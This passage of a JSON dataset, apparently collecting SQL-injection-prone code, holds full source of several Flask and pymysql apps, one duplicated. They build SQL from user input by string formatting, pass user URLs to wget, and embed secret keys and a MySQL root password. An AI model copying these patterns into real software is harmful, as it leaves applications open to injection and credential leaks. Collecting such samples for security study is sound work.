games_users]\n    print 'games_user', games_users\n    # Game attribute filter\n    query = ''\n    for key, value in request.args.iteritems(multi=True):\n        query = game_query_builder(key, value, query)\n    query = query[:-5]\n    categories = request.args.getlist('category')\n    if len(categories) == 0:\n        attr_games = Game.query.filter(sqlalchemy.text(query)).all()\n    else:\n        # Consider game categories\n        attr_games = (Game.query.filter(sqlalchemy.text(query)).filter(\n            Game.categories.any(GameCategory.id.in_(categories))).all())\n    attr_games = [game.id for game in attr_games]\n    print 'games_query', attr_games\n    # Union of club and user games\n    owned_games = set(games_club) | set(games_users)\n    print 'union', owned_games\n    # Intersection of owned_games and attr_games\n    games_id = ((set(attr_games) & owned_games)\n                if len(owned_games) > 0 else set(attr_games))\n    print 'intersection', games_id\n    # Get all games satisfying the search criteria\n    games = Game.query.filter(Game.id.in_(games_id)).all()\n    games_dict = sql_to_dicts(*games)\n    # Add category info to each game_dict\n    games_categories = {}\n    for game in games:\n        games_categories[game.id] = [game_category.name for game_category in\n                                     game.categories]\n    for game_dict in games_dict:\n        game_dict['category'] = games_categories[game_dict['id']]\n    return jsonify(games=games_dict)\n\n\n@app.route('/api/info')\ndef api_info():\n    \"\"\"Return basic information on all sql entries of chosen types.\n\n    Valid query args:\n        users=1\n        categories=1\n        games=1\n\n    The response is in JSON.\n    \"\"\"\n    d = {\n        'users': User.query.all(),\n        'categories': GameCategory.query.all(),\n        'games': Game.query.all()\n    }\n    info = {}\n    for key, value in request.args.iteritems():\n        if d.get(key) and value == '1':\n            sql_all_dict = sql_to_dicts(*d[key])\n            info[key] = dicts_purge(sql_all_dict,\n                                    *['id', 'name', 'year_published'])\n    return jsonify(**info)\n\n\n@app.route('/gconnect', methods=['POST'])\ndef g_connect():\n    \"\"\"Sign in user.\"\"\"\n    # Additional csrf check\n    if not request.headers.get('X-Requested-With'):\n        abort(403)\n    # Get one-time code from the end-user\n    auth_code = request.get_json().get('auth_code')\n    # Exchange one-time code for id_token and access_token\n    try:\n        credentials = client.credentials_from_clientsecrets_and_code(\n            app.config['CLIENT_SECRET_FILE'],\n            ['https://www.googleapis.com/auth/drive.appdata', 'profile',\n             'email'],\n            auth_code)\n    except client.FlowExchangeError:\n        return error_response('Failed to upgrade one-time authorization code.',\n                              401)\n    # Validate id_token\n    if not validate_id_token(credentials.id_token, credentials.id_token_jwt):\n        return error_response('id token is not valid', 500)\n    # Get user info from access token\n    userinfo_url = \"https://www.googleapis.com/oauth2/v1/userinfo\"\n    params = {'access_token': credentials.access_token, 'alt': 'json'}\n    answer = requests.get(userinfo_url, params=params)\n    user_data = answer.json()\n    # Store user info in the session for later use\n    session['email'] = credentials.id_token['email']\n    session['username'] = user_data['name']\n    session['access_token'] = credentials.access_token\n    # If the user does not exist, add him to the database\n    session['user_id'], new_user = check_user(\n        session['email'], session['username'],  user_data['picture'])\n    # Response\n    body = {'username': user_data['name'],\n            'user_id': session['user_id'],\n            'new_user': new_user}\n    return json_response(body, 200)\n\n\n@app.route('/gdisconnect', methods=['POST'])\ndef g_disconnect():\n    \"\"\"Sign out user.\"\"\"\n    sign_out()\n    flash('Signed out!')\n    return '', 204\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/yannvon/table-detection/blob/0d82d281798fd623993feffbbcc9721bd3d12047",
        "file_path": "/bar.py",
        "source": "import subprocess\nimport shlex\nimport os\nimport signal\nfrom helper import path_dict, path_number_of_files, pdf_stats, pdf_date_format_to_datetime\nimport json\nfrom functools import wraps\nfrom urllib.parse import urlparse\n\nfrom flask import Flask, render_template, flash, redirect, url_for, session, request, logging\nfrom flask_mysqldb import MySQL\nfrom wtforms import Form, StringField, TextAreaField, PasswordField, validators\nfrom passlib.hash import sha256_crypt\nimport time\n\napp = Flask(__name__)\napp.secret_key = 'Aj\"$7PE#>3AC6W]`STXYLz*[G\\gQWA'\n\n\n# Config MySQL\napp.config['MYSQL_HOST'] = 'localhost'\napp.config['MYSQL_USER'] = 'root'\napp.config['MYSQL_PASSWORD'] = 'mountain'\napp.config['MYSQL_DB'] = 'bar'\napp.config['MYSQL_CURSORCLASS'] = 'DictCursor'\n\n# init MySQL\nmysql = MySQL(app)\n\n# CONSTANTS\nWGET_DATA_PATH = 'data'\nPDF_TO_PROCESS = 10\nMAX_CRAWLING_DURATION = 60 # 15 minutes\nWAIT_AFTER_CRAWLING = 1000\n\n\n# Helper Function\n\n# Check if user logged in\ndef is_logged_in(f):\n    @wraps(f)\n    def wrap(*args, **kwargs):\n        if 'logged_in' in session:\n            return f(*args, **kwargs)\n        else:\n            flash('Unauthorized, Please login', 'danger')\n            return redirect(url_for('login'))\n    return wrap\n\n\n# Index\n@app.route('/', methods=['GET', 'POST'])\ndef index():\n    if request.method == 'POST': #FIXME I didn't handle security yet !! make sure only logged-in people can execute\n\n        # User can type in url\n        # The url will then get parsed to extract domain, while the crawler starts at url.\n\n        # Get Form Fields and save\n        url = request.form['url']\n        parsed = urlparse(url)\n\n        session['domain'] = parsed.netloc\n        session['url'] = url\n\n        # TODO use WTForms to get validation\n\n        return redirect(url_for('crawling'))\n\n    return render_template('home.html')\n\n\n# Crawling\n@app.route('/crawling')\n@is_logged_in\ndef crawling():\n    # STEP 0: TimeKeeping\n    session['crawl_start_time'] = time.time()\n\n    # STEP 1: Prepare WGET command\n    url = session.get('url', None)\n\n    command = shlex.split(\"timeout %d wget -r -A pdf %s\" % (MAX_CRAWLING_DURATION, url,)) #FIXME timeout remove\n    #command = shlex.split(\"wget -r -A pdf %s\" % (url,))\n\n    #TODO use celery\n    #TODO give feedback how wget is doing\n\n    #TODO https://stackoverflow.com/questions/15041620/how-to-continuously-display-python-output-in-a-webpage\n\n    # STEP 2: Execute command in subdirectory\n    process = subprocess.Popen(command, cwd=WGET_DATA_PATH)\n    session['crawl_process_id'] = process.pid\n\n    return render_template('crawling.html', max_crawling_duration=MAX_CRAWLING_DURATION)\n\n\n# End Crawling Manual\n@app.route('/crawling/end')\n@is_logged_in\ndef end_crawling():\n\n    # STEP 1: Kill crawl process\n    p_id = session.get('crawl_process_id', None)\n    os.kill(p_id, signal.SIGTERM)\n\n    session['crawl_process_id'] = -1\n\n    # STEP 2: TimeKeeping\n    crawl_start_time = session.get('crawl_start_time', None)\n    session['crawl_total_time'] = time.time() - crawl_start_time\n\n    # STEP 3: Successful interruption\n    flash('You successfully interrupted the crawler', 'success')\n\n    return render_template('end_crawling.html')\n\n\n# End Crawling Automatic\n@app.route('/crawling/autoend')\n@is_logged_in\ndef autoend_crawling():\n\n    # STEP 0: Check if already interrupted\n    p_id = session.get('crawl_process_id', None)\n    if p_id < 0:\n        return \"process already killed\"\n    else:\n        # STEP 1: Kill crawl process\n        os.kill(p_id, signal.SIGTERM)\n\n        # STEP 2: TimeKeeping\n        crawl_start_time = session.get('crawl_start_time', None)\n        session['crawl_total_time'] = time.time() - crawl_start_time\n\n        # STEP 3: Successful interruption\n        flash('Time Limit reached - Crawler interrupted automatically', 'success')\n\n        return redirect(url_for(\"table_detection\"))\n\n\n# Start table detection\n@app.route('/table_detection')\n@is_logged_in\ndef table_detection():\n    return render_template('table_detection.html', wait=WAIT_AFTER_CRAWLING)\n\n\n# About\n@app.route('/about')\ndef about():\n    return render_template('about.html')\n\n\n# PDF processing\n@app.route('/processing')\n@is_logged_in\ndef processing():\n\n    # STEP 0: Time keeping\n    proc_start_time = time.time()\n\n    domain = session.get('domain', None)\n    if domain == None:\n        pass\n        # TODO think of bad cases\n\n    path = \"data/%s\" % (domain,)\n\n    # STEP 1: Call Helper function to create Json string\n\n    # FIXME workaround to weird file system bug with latin/ cp1252 encoding..\n    # https://stackoverflow.com/questions/35959580/non-ascii-file-name-issue-with-os-walk works\n    # https://stackoverflow.com/questions/2004137/unicodeencodeerror-on-joining-file-name doesn't work\n    hierarchy_dict = path_dict(path)  # adding ur does not work as expected either\n    hierarchy_json = json.dumps(hierarchy_dict, sort_keys=True, indent=4)  # , encoding='cp1252' not needed in python3\n\n    # FIXME remove all session stores\n\n    # STEP 2: Call helper function to count number of pdf files\n    n_files = path_number_of_files(path)\n    session['n_files'] = n_files\n\n    # STEP 3: Extract tables from pdf's\n    stats, n_error, n_success = pdf_stats(path, PDF_TO_PROCESS)\n\n    # STEP 4: Save stats\n    session['n_error'] = n_error\n    session['n_success'] = n_success\n    stats_json = json.dumps(stats, sort_keys=True, indent=4)\n    session['stats'] = stats_json\n\n    # STEP 5: Time Keeping\n    proc_over_time = time.time()\n    proc_total_time = proc_over_time - proc_start_time\n\n    # STEP 6: Save query in DB\n    # Create cursor\n    cur = mysql.connection.cursor()\n\n    # Execute query\n    cur.execute(\"INSERT INTO Crawls(cid, crawl_date, pdf_crawled, pdf_processed, process_errors, domain, url, hierarchy, stats, crawl_total_time, proc_total_time) VALUES(NULL, NULL, %s ,%s, %s, %s, %s, %s, %s, %s, %s)\",\n                (n_files, n_success, n_error, domain, session.get('url', None), hierarchy_json, stats_json, session.get('crawl_total_time', None), proc_total_time))\n\n    # Commit to DB\n    mysql.connection.commit()\n\n    # Close connection\n    cur.close()\n\n    return render_template('processing.html', n_files=n_success, domain=domain, cid=0)\n\n# Last Crawl Statistics\n@app.route('/statistics')\n@is_logged_in\ndef statistics():\n    # Create cursor\n    cur = mysql.connection.cursor()\n\n    # Get user by username\n    cur.execute(\"SELECT cid FROM Crawls WHERE crawl_date = (SELECT max(crawl_date) FROM Crawls)\")\n\n    result = cur.fetchone()\n\n    # Close connection\n    cur.close()\n\n    if result:\n        cid_last_crawl = result[\"cid\"]\n        return redirect(url_for(\"cid_statistics\", cid=cid_last_crawl))\n    else:\n        flash(\"There are no statistics to display, please start a new query and wait for it to complete.\", \"danger\")\n        return redirect(url_for(\"index\"))\n\n\n# CID specific Statistics\n@app.route('/statistics/<int:cid>')\n@is_logged_in\ndef cid_statistics(cid):\n\n    # STEP 1: retrieve all saved stats from DB\n    # Create cursor\n    cur = mysql.connection.cursor()\n\n    result = cur.execute('SELECT * FROM Crawls WHERE cid = %s' % cid)\n    crawl = cur.fetchall()[0]\n\n    # Close connection\n    cur.close();\n\n    print(session.get('stats', None))\n    print(crawl['stats'])\n\n    # STEP 2: do some processing to retrieve interesting info from stats\n    json_stats = json.loads(crawl['stats'])\n    json_hierarchy = json.loads(crawl['hierarchy'])\n\n    stats_items = json_stats.items()\n    n_tables = sum([subdict['n_tables_pages'] for filename, subdict in stats_items])\n    n_rows = sum([subdict['n_table_rows'] for filename, subdict in stats_items])\n\n    medium_tables = sum([subdict['table_sizes']['medium'] for filename, subdict in stats_items])\n    small_tables = sum([subdict['table_sizes']['small'] for filename, subdict in stats_items])\n    large_tables = sum([subdict['table_sizes']['large'] for filename, subdict in stats_items])\n\n    # Find some stats about creation dates\n    creation_dates_pdf = [subdict['creation_date'] for filename, subdict in stats_items]\n    creation_dates = list(map(lambda str : pdf_date_format_to_datetime(str), creation_dates_pdf))\n\n    if len(creation_dates) > 0:\n        oldest_pdf = min(creation_dates)\n        most_recent_pdf = max(creation_dates)\n    else:\n        oldest_pdf = \"None\"\n        most_recent_pdf = \"None\"\n\n    return render_template('statistics.html', n_files=crawl['pdf_crawled'], n_success=crawl['pdf_processed'],\n                           n_tables=n_tables, n_rows=n_rows, n_errors=crawl['process_errors'], domain=crawl['domain'],\n                           small_tables=small_tables, medium_tables=medium_tables,\n                           large_tables=large_tables, stats=json_stats, hierarchy=json_hierarchy,\n                           end_time=crawl['crawl_date'], crawl_total_time=round(crawl['crawl_total_time'] / 60.0, 1),\n                           proc_total_time=round(crawl['proc_total_time'] / 60.0, 1),\n                           oldest_pdf=oldest_pdf, most_recent_pdf=most_recent_pdf)\n\n\nclass RegisterForm(Form):\n    name = StringField('Name', [validators.Length(min=1, max=50)])\n    username = StringField('Username', [validators.Length(min=4, max=25)])\n    email = StringField('Email', [validators.Length(min=6, max=50)])\n    password = PasswordField('Password', [validators.DataRequired(),\n                                          validators.EqualTo('confirm', message='Passwords do not match')])\n    confirm = PasswordField('Confirm Password')\n\n\n# Register\n@app.route('/register', methods=['GET', 'POST'])\ndef register():\n    form = RegisterForm(request.form)\n    if request.method == 'POST' and form.validate():\n        name = form.name.data\n        email = form.email.data\n        username = form.username.data\n        password = sha256_crypt.encrypt(str(form.password.data))\n\n        # Create cursor\n        cur = mysql.connection.cursor()\n\n        # Execute query\n        cur.execute(\"INSERT INTO Users(name, email, username, password) VALUES(%s, %s, %s, %s)\",\n                    (name, email, username, password))\n\n        # Commit to DB\n        mysql.connection.commit()\n\n        # Close connection\n        cur.close()\n\n        flash('You are now registered and can log in', 'success')\n\n        return redirect(url_for('login'))\n\n    return render_template('register.html', form=form)\n\n\n# User login\n@app.route('/login', methods=['GET', 'POST'])\ndef login():\n    if request.method == 'POST':\n        # Get Form Fields\n        username = request.form['username'] # FIXME SQL_injection danger?\n        password_candidate = request.form['password']\n\n        # Create cursor\n        cur = mysql.connection.cursor()\n\n        # Get user by username\n        result = cur.execute(\"SELECT * FROM Users WHERE username = %s\", [username])\n\n        if result > 0:\n            # Get stored hash\n            data = cur.fetchone() # FIXME fucking stupid username is not primary key\n            password = data['password']\n\n            # Compare passwords\n            if sha256_crypt.verify(password_candidate, password): # FIXME how does sha256 work?\n\n                # Check was successful -> create session variables\n                session['logged_in'] = True\n                session['username'] = username\n\n                flash('You are now logged in', 'success')\n                return redirect(url_for('index'))\n            else:\n                error = 'Invalid login'\n                return render_template('login.html', error=error)\n\n        else:\n            error = 'Username not found'\n            return render_template('login.html', error=error)\n\n        # Close connection\n        cur.close() # FIXME shouldn't that happen before return?\n\n    return render_template('login.html')\n\n\n# Delete Crawl\n@app.route('/delete_crawl', methods=['POST'])\n@is_logged_in\ndef delete_crawl():\n\n        # Get Form Fields\n        cid = request.form['cid']\n\n        # Create cursor\n        cur = mysql.connection.cursor()\n\n        # Get user by username\n        result = cur.execute(\"DELETE FROM Crawls WHERE cid = %s\" % cid)\n\n        # Commit to DB\n        mysql.connection.commit()\n\n        # Close connection\n        cur.close()\n\n        # FIXME check if successfull first, return message\n        flash('Crawl successfully removed', 'success')\n\n        return redirect(url_for('dashboard'))\n\n\n# Logout\n@app.route('/logout')\n@is_logged_in\ndef logout():\n    session.clear()\n    flash('You are now logged out', 'success')\n    return redirect(url_for('login'))\n\n\n# Dashboard\n@app.route('/dashboard')\n@is_logged_in\ndef dashboard():\n\n    # Create cursor\n    cur = mysql.connection.cursor()\n\n    # Get Crawls\n    result = cur.execute(\"SELECT cid, crawl_date, pdf_crawled, pdf_processed, domain, url FROM Crawls\")\n\n    crawls = cur.fetchall()\n\n    if result > 0:\n        return render_template('dashboard.html', crawls=crawls)\n    else:\n        msg = 'No Crawls Found'\n        return render_template('dashboard.html', msg=msg)\n\n    # Close connection FIXME is this code executed\n    cur.close()\n\n\nif __name__ == '__main__':\n    app.secret_key='Aj\"$7PE#>3AC6W]`STXYLz*[G\\gQWA'\n    app.run(debug=True)\n    #app.run(host='0.0.0.0')\n\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/eXascaleInfolab/2018-Internship-TableDetection/blob/0d82d281798fd623993feffbbcc9721bd3d12047",
        "file_path": "/bar.py",
        "source": "import subprocess\nimport shlex\nimport os\nimport signal\nfrom helper import path_dict, path_number_of_files, pdf_stats, pdf_date_format_to_datetime\nimport json\nfrom functools import wraps\nfrom urllib.parse import urlparse\n\nfrom flask import Flask, render_template, flash, redirect, url_for, session, request, logging\nfrom flask_mysqldb import MySQL\nfrom wtforms import Form, StringField, TextAreaField, PasswordField, validators\nfrom passlib.hash import sha256_crypt\nimport time\n\napp = Flask(__name__)\napp.secret_key = 'Aj\"$7PE#>3AC6W]`STXYLz*[G\\gQWA'\n\n\n# Config MySQL\napp.config['MYSQL_HOST'] = 'localhost'\napp.config['MYSQL_USER'] = 'root'\napp.config['MYSQL_PASSWORD'] = 'mountain'\napp.config['MYSQL_DB'] = 'bar'\napp.config['MYSQL_CURSORCLASS'] = 'DictCursor'\n\n# init MySQL\nmysql = MySQL(app)\n\n# CONSTANTS\nWGET_DATA_PATH = 'data'\nPDF_TO_PROCESS = 10\nMAX_CRAWLING_DURATION = 60 # 15 minutes\nWAIT_AFTER_CRAWLING = 1000\n\n\n# Helper Function\n\n# Check if user logged in\ndef is_logged_in(f):\n    @wraps(f)\n    def wrap(*args, **kwargs):\n        if 'logged_in' in session:\n            return f(*args, **kwargs)\n        else:\n            flash('Unauthorized, Please login', 'danger')\n            return redirect(url_for('login'))\n    return wrap\n\n\n# Index\n@app.route('/', methods=['GET', 'POST'])\ndef index():\n    if request.method == 'POST': #FIXME I didn't handle security yet !! make sure only logged-in people can execute\n\n        # User can type in url\n        # The url will then get parsed to extract domain, while the crawler starts at url.\n\n        # Get Form Fields and save\n        url = request.form['url']\n        parsed = urlparse(url)\n\n        session['domain'] = parsed.netloc\n        session['url'] = url\n\n        # TODO use WTForms to get validation\n\n        return redirect(url_for('crawling'))\n\n    return render_template('home.html')\n\n\n# Crawling\n@app.route('/crawling')\n@is_logged_in\ndef crawling():\n    # STEP 0: TimeKeeping\n    session['crawl_start_time'] = time.time()\n\n    # STEP 1: Prepare WGET command\n    url = session.get('url', None)\n\n    command = shlex.split(\"timeout %d wget -r -A pdf %s\" % (MAX_CRAWLING_DURATION, url,)) #FIXME timeout remove\n    #command = shlex.split(\"wget -r -A pdf %s\" % (url,))\n\n    #TODO use celery\n    #TODO give feedback how wget is doing\n\n    #TODO https://stackoverflow.com/questions/15041620/how-to-continuously-display-python-output-in-a-webpage\n\n    # STEP 2: Execute command in subdirectory\n    process = subprocess.Popen(command, cwd=WGET_DATA_PATH)\n    session['crawl_process_id'] = process.pid\n\n    return render_template('crawling.html', max_crawling_duration=MAX_CRAWLING_DURATION)\n\n\n# End Crawling Manual\n@app.route('/crawling/end')\n@is_logged_in\ndef end_crawling():\n\n    # STEP 1: Kill crawl process\n    p_id = session.get('crawl_process_id', None)\n    os.kill(p_id, signal.SIGTERM)\n\n    session['crawl_process_id'] = -1\n\n    # STEP 2: TimeKeeping\n    crawl_start_time = session.get('crawl_start_time', None)\n    session['crawl_total_time'] = time.time() - crawl_start_time\n\n    # STEP 3: Successful interruption\n    flash('You successfully interrupted the crawler', 'success')\n\n    return render_template('end_crawling.html')\n\n\n# End Crawling Automatic\n@app.route('/crawling/autoend')\n@is_logged_in\ndef autoend_crawling():\n\n    # STEP 0: Check if already interrupted\n    p_id = session.get('crawl_process_id', None)\n    if p_id < 0:\n        return \"process already killed\"\n    else:\n        # STEP 1: Kill crawl process\n        os.kill(p_id, signal.SIGTERM)\n\n        # STEP 2: TimeKeeping\n        crawl_start_time = session.get('crawl_start_time', None)\n        session['crawl_total_time'] = time.time() - crawl_start_time\n\n        # STEP 3: Successful interruption\n        flash('Time Limit reached - Crawler interrupted automatically', 'success')\n\n        return redirect(url_for(\"table_detection\"))\n\n\n# Start table detection\n@app.route('/table_detection')\n@is_logged_in\ndef table_detection():\n    return render_template('table_detection.html', wait=WAIT_AFTER_CRAWLING)\n\n\n# About\n@app.route('/about')\ndef about():\n    return render_template('about.html')\n\n\n# PDF processing\n@app.route('/processing')\n@is_logged_in\ndef processing():\n\n    # STEP 0: Time keeping\n    proc_start_time = time.time()\n\n    domain = session.get('domain', None)\n    if domain == None:\n        pass\n        # TODO think of bad cases\n\n    path = \"data/%s\" % (domain,)\n\n    # STEP 1: Call Helper function to create Json string\n\n    # FIXME workaround to weird file system bug with latin/ cp1252 encoding..\n    # https://stackoverflow.com/questions/35959580/non-ascii-file-name-issue-with-os-walk works\n    # https://stackoverflow.com/questions/2004137/unicodeencodeerror-on-joining-file-name doesn't work\n    hierarchy_dict = path_dict(path)  # adding ur does not work as expected either\n    hierarchy_json = json.dumps(hierarchy_dict, sort_keys=True, indent=4)  # , encoding='cp1252' not needed in python3\n\n    # FIXME remove all session stores\n\n    # STEP 2: Call helper function to count number of pdf files\n    n_files = path_number_of_files(path)\n    session['n_files'] = n_files\n\n    # STEP 3: Extract tables from pdf's\n    stats, n_error, n_success = pdf_stats(path, PDF_TO_PROCESS)\n\n    # STEP 4: Save stats\n    session['n_error'] = n_error\n    session['n_success'] = n_success\n    stats_json = json.dumps(stats, sort_keys=True, indent=4)\n    session['stats'] = stats_json\n\n    # STEP 5: Time Keeping\n    proc_over_time = time.time()\n    proc_total_time = proc_over_time - proc_start_time\n\n    # STEP 6: Save query in DB\n    # Create cursor\n    cur = mysql.connection.cursor()\n\n    # Execute query\n    cur.execute(\"INSERT INTO Crawls(cid, crawl_date, pdf_crawled, pdf_processed, process_errors, domain, url, hierarchy, stats, crawl_total_time, proc_total_time) VALUES(NULL, NULL, %s ,%s, %s, %s, %s, %s, %s, %s, %s)\",\n                (n_files, n_success, n_error, domain, session.get('url', None), hierarchy_json, stats_json, session.get('crawl_total_time', None), proc_total_time))\n\n    # Commit to DB\n    mysql.connection.commit()\n\n    # Close connection\n    cur.close()\n\n    return render_template('processing.html', n_files=n_success, domain=domain, cid=0)\n\n# Last Crawl Statistics\n@app.route('/statistics')\n@is_logged_in\ndef statistics():\n    # Create cursor\n    cur = mysql.connection.cursor()\n\n    # Get user by username\n    cur.execute(\"SELECT cid FROM Crawls WHERE crawl_date = (SELECT max(crawl_date) FROM Crawls)\")\n\n    result = cur.fetchone()\n\n    # Close connection\n    cur.close()\n\n    if result:\n        cid_last_crawl = result[\"cid\"]\n        return redirect(url_for(\"cid_statistics\", cid=cid_last_crawl))\n    else:\n        flash(\"There are no statistics to display, please start a new query and wait for it to complete.\", \"danger\")\n        return redirect(url_for(\"index\"))\n\n\n# CID specific Statistics\n@app.route('/statistics/<int:cid>')\n@is_logged_in\ndef cid_statistics(cid):\n\n    # STEP 1: retrieve all saved stats from DB\n    # Create cursor\n    cur = mysql.connection.cursor()\n\n    result = cur.execute('SELECT * FROM Crawls WHERE cid = %s' % cid)\n    crawl = cur.fetchall()[0]\n\n    # Close connection\n    cur.close();\n\n    print(session.get('stats', None))\n    print(crawl['stats'])\n\n    # STEP 2: do some processing to retrieve interesting info from stats\n    json_stats = json.loads(crawl['stats'])\n    json_hierarchy = json.loads(crawl['hierarchy'])\n\n    stats_items = json_stats.items()\n    n_tables = sum([subdict['n_tables_pages'] for filename, subdict in stats_items])\n    n_rows = sum([subdict['n_table_rows'] for filename, subdict in stats_items])\n\n    medium_tables = sum([subdict['table_sizes']['medium'] for filename, subdict in stats_items])\n    small_tables = sum([subdict['table_sizes']['small'] for filename, subdict in stats_items])\n    large_tables = sum([subdict['table_sizes']['large'] for filename, subdict in stats_items])\n\n    # Find some stats about creation dates\n    creation_dates_pdf = [subdict['creation_date'] for filename, subdict in stats_items]\n    creation_dates = list(map(lambda str : pdf_date_format_to_datetime(str), creation_dates_pdf))\n\n    if len(creation_dates) > 0:\n        oldest_pdf = min(creation_dates)\n        most_recent_pdf = max(creation_dates)\n    else:\n        oldest_pdf = \"None\"\n        most_recent_pdf = \"None\"\n\n    return render_template('statistics.html', n_files=crawl['pdf_crawled'], n_success=crawl['pdf_processed'],\n                           n_tables=n_tables, n_rows=n_rows, n_errors=crawl['process_errors'], domain=crawl['domain'],\n                           small_tables=small_tables, medium_tables=medium_tables,\n                           large_tables=large_tables, stats=json_stats, hierarchy=json_hierarchy,\n                           end_time=crawl['crawl_date'], crawl_total_time=round(crawl['crawl_total_time'] / 60.0, 1),\n                           proc_total_time=round(crawl['proc_total_time'] / 60.0, 1),\n                           oldest_pdf=oldest_pdf, most_recent_pdf=most_recent_pdf)\n\n\nclass RegisterForm(Form):\n    name = StringField('Name', [validators.Length(min=1, max=50)])\n    username = StringField('Username', [validators.Length(min=4, max=25)])\n    email = StringField('Email', [validators.Length(min=6, max=50)])\n    password = PasswordField('Password', [validators.DataRequired(),\n                                          validators.EqualTo('confirm', message='Passwords do not match')])\n    confirm = PasswordField('Confirm Password')\n\n\n# Register\n@app.route('/register', methods=['GET', 'POST'])\ndef register():\n    form = RegisterForm(request.form)\n    if request.method == 'POST' and form.validate():\n        name = form.name.data\n        email = form.email.data\n        username = form.username.data\n        password = sha256_crypt.encrypt(str(form.password.data))\n\n        # Create cursor\n        cur = mysql.connection.cursor()\n\n        # Execute query\n        cur.execute(\"INSERT INTO Users(name, email, username, password) VALUES(%s, %s, %s, %s)\",\n                    (name, email, username, password))\n\n        # Commit to DB\n        mysql.connection.commit()\n\n        # Close connection\n        cur.close()\n\n        flash('You are now registered and can log in', 'success')\n\n        return redirect(url_for('login'))\n\n    return render_template('register.html', form=form)\n\n\n# User login\n@app.route('/login', methods=['GET', 'POST'])\ndef login():\n    if request.method == 'POST':\n        # Get Form Fields\n        username = request.form['username'] # FIXME SQL_injection danger?\n        password_candidate = request.form['password']\n\n        # Create cursor\n        cur = mysql.connection.cursor()\n\n        # Get user by username\n        result = cur.execute(\"SELECT * FROM Users WHERE username = %s\", [username])\n\n        if result > 0:\n            # Get stored hash\n            data = cur.fetchone() # FIXME fucking stupid username is not primary key\n            password = data['password']\n\n            # Compare passwords\n            if sha256_crypt.verify(password_candidate, password): # FIXME how does sha256 work?\n\n                # Check was successful -> create session variables\n                session['logged_in'] = True\n                session['username'] = username\n\n                flash('You are now logged in', 'success')\n                return redirect(url_for('index'))\n            else:\n                error = 'Invalid login'\n                return render_template('login.html', error=error)\n\n        else:\n            error = 'Username not found'\n            return render_template('login.html', error=error)\n\n        # Close connection\n        cur.close() # FIXME shouldn't that happen before return?\n\n    return render_template('login.html')\n\n\n# Delete Crawl\n@app.route('/delete_crawl', methods=['POST'])\n@is_logged_in\ndef delete_crawl():\n\n        # Get Form Fields\n        cid = request.form['cid']\n\n        # Create cursor\n        cur = mysql.connection.cursor()\n\n        # Get user by username\n        result = cur.execute(\"DELETE FROM Crawls WHERE cid = %s\" % cid)\n\n        # Commit to DB\n        mysql.connection.commit()\n\n        # Close connection\n        cur.close()\n\n        # FIXME check if successfull first, return message\n        flash('Crawl successfully removed', 'success')\n\n        return redirect(url_for('dashboard'))\n\n\n# Logout\n@app.route('/logout')\n@is_logged_in\ndef logout():\n    session.clear()\n    flash('You are now logged out', 'success')\n    return redirect(url_for('login'))\n\n\n# Dashboard\n@app.route('/dashboard')\n@is_logged_in\ndef dashboard():\n\n    # Create cursor\n    cur = mysql.connection.cursor()\n\n    # Get Crawls\n    result = cur.execute(\"SELECT cid, crawl_date, pdf_crawled, pdf_processed, domain, url FROM Crawls\")\n\n    crawls = cur.fetchall()\n\n    if result > 0:\n        return render_template('dashboard.html', crawls=crawls)\n    else:\n        msg = 'No Crawls Found'\n        return render_template('dashboard.html', msg=msg)\n\n    # Close connection FIXME is this code executed\n    cur.close()\n\n\nif __name__ == '__main__':\n    app.secret_key='Aj\"$7PE#>3AC6W]`STXYLz*[G\\gQWA'\n    app.run(debug=True)\n    #app.run(host='0.0.0.0')\n\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/dead911/flask/blob/1fae505aaff93917495fc5a2d9ff248c569c88e0",
        "file_path": "/crimemap/dbhelper.py",
        "source": "import pymysql\nimport dbconfig\n\nclass DBHelper:\n    def connect(self, database=\"crimemap\"):\n        return pymysql.connect(host='localhost',\n                               user=dbconfig.db_user,\n                               passwd=dbconfig.db_password,\n                               db=database)\n\n    def get_all_inputs(self):\n        connection=self.connect()\n        try:\n            query=\"SELECT description FROM crimes;\"\n            with connection.cursor() as cursor:\n                cursor.execute(query)\n            return cursor.fetchall()\n        finally:\n            connection.close()\n\n    def add_input(self, data):\n        connection=self.connect()\n        try:\n            query=\"INSERT INTO crimes (description) VALUES ('{}');\".format(data)\n            with connection.cursor() as cursor:\n                cursor.execute(query)\n                connection.commit()\n        finally:\n            connection.close()\n\n    def clear_all(self):\n        connection=self.connect()\n        try:\n            query=\"DELETE FROM crimes;\"\n            with connection.cursor() as cursor:\n                cursor.execute(query)\n                connection.commit()\n        finally:\n            connection.close()\n\n\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/memoryStack/crimeMap/blob/f767fe3f9d4c3b8fae20fd9e6541218b34adf63a",
        "file_path": "/dbhelper.py",
        "source": "import pymysql\nimport dbconfig\n\nclass DBHelper:\n\n\tdef connect(self, datbase=\"crimemap\"):\n\t\treturn pymysql.connect(host='localhost',\n\t\t\t\t\t\t\tuser=dbconfig.db_user,\n\t\t\t\t\t\t\tpasswd=dbconfig.db_password,\n\t\t\t\t\t\t\tdb=datbase)\n\n\tdef get_all_inputs(self):\n\tconnection = self.connect()\n\t\ttry:\n\t\t\tquery = \"SELECT description FROM crimes;\"\n\t\t\twith connection.cursor() as cursor:\n\t\t\t\tcursor.execute(query)\n\t\t\treturn cursor.fetchall()\n\t\tfinally:\n\t\t\tconnection.close()\n\n\tdef add_input(self, data):\n\t\tconnection = self.connect()\n\t\ttry:\n\t\t\tquery = \"INSERT INTO crimes (description) VALUES ('{}');\".format(data) #i didn't understand this '.format(data)'\n\t\t\twith connection.cursor() as cursor:\n\t\t\t\tcursor.execute(query)\n\t\t\t\tconnection.commit()\n\t\tfinally:\n\t\t\tconnection.close()\n\n\tdef clear_all(self):\n\t\tconnection.connect(self):\n\t\ttry:\n\t\t\tquery = \"DELETE FROM crimes;\"\n\t\t\twith connection.cursor() as cursor:\n\t\t\t\tcursor.execute(query)\n\t\t\t\tconnection.commit()\n\t\tfinally:\n\t\t\tconnection.close()\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/MrCirca/scripts/blob/de55d93eacec2ff7e7e7b4d21a7d8d1ef39c910c",
        "file_path": "/freepbx_wav_to_mp3_converter.py",
